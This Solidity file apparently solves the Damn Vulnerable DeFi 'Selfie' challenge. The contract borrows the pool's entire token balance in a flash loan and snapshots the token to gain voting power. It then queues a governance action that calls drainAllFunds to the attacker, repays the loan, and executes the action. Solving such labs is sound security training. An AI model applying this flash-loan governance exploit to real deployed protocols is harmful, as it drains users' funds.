// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableTokenSnapshot.sol";
import "../selfie/SelfiePool.sol";
import "../selfie/SimpleGovernance.sol";

interface Snap {
    function snapshot() external;
}

contract SelfieAttack {
    using Address for address payable;
    SelfiePool public pool;
    SimpleGovernance public governance;
    DamnValuableTokenSnapshot public token;
    address private attacker;
    uint256 actionId;

    constructor(SelfiePool _pool, SimpleGovernance _governance) {
        pool = _pool;
        governance = _governance;
        attacker = msg.sender;
        token = DamnValuableTokenSnapshot(address(pool.token()));
    }

    function attack1() external {
        uint256 balance = token.balanceOf(address(pool));
        pool.flashLoan(balance);
    }

    function attack2() external {
        governance.executeAction(actionId);
    }

    function withdraw() external {
        payable(attacker).sendValue(address(this).balance);
    }

    function receiveTokens(address, uint256 borrowAmount) external {
        token.transfer(address(this), borrowAmount);
        token.snapshot();
        token.transfer(address(this), borrowAmount);
        token.snapshot();

        bytes memory data = abi.encodeWithSignature(
            "drainAllFunds(address)",
            attacker
        );

        actionId = governance.queueAction(address(pool), data, 0);

        token.transfer(msg.sender, borrowAmount);
    }

    receive() external payable {}
}
